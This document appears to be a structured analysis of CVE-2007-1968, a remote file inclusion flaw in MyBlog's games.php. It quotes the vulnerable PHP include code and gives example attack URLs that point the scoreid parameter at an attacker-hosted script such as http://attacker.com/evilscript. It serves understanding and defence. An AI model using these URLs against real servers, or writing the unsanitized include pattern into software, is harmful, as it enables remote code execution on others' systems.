Based on the provided content, here's an analysis of CVE-2007-1968:

**Root Cause of Vulnerability:**

The vulnerability stems from the insecure use of the `include()` function in the `games.php` file of MyBlog. The script directly includes files based on user-supplied input via the `scoreid` GET parameter without proper sanitization or validation.

**Weaknesses/Vulnerabilities Present:**

- **Remote File Inclusion (RFI):** The primary weakness is the ability to include remote files. By manipulating the `scoreid` parameter, an attacker can force the application to include and execute arbitrary code from a remote server.

**Impact of Exploitation:**

- **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the server hosting the vulnerable MyBlog application, potentially gaining full control of the system.

**Attack Vectors:**

- **HTTP GET Parameter Manipulation:** The attack vector is through the `scoreid` GET parameter in the `games.php` file. An attacker crafts a URL with the `scoreid` parameter pointing to a malicious file hosted on a remote server.

**Required Attacker Capabilities/Position:**

- **Network Access:** The attacker needs network access to the vulnerable server to send the crafted HTTP request.
- **Ability to Host Malicious Files:** The attacker needs to have a server or hosting platform where they can store and serve the malicious file to be included.

**Technical Details:**

The vulnerable code snippet from `os/games.php` is:

```php
if (isset($_GET['scoreid'])) {
  echo "Top Score for this game: ";
  include($_GET['scoreid'] . "_score.txt");
  echo ", Set By:";
  include($_GET['scoreid'] . "_setby.txt");
}
```
This code takes the value of the `scoreid` parameter, appends `_score.txt` and `_setby.txt` to it, and then includes these files, without sanitization. This allows the attacker to supply the malicious script url to include via the `scoreid` parameter. For example:  `www.example.com/[path]/games.php?scoreid=http://attacker.com/evilscript` would execute the malicious script hosted on `http://attacker.com/evilscript`.

The exploit-db content provides a proof of concept URL:
`www.example.com/[path]/games.php?scoreid=[Sh3ll-Script]` which demonstrates the ability to execute remote files.
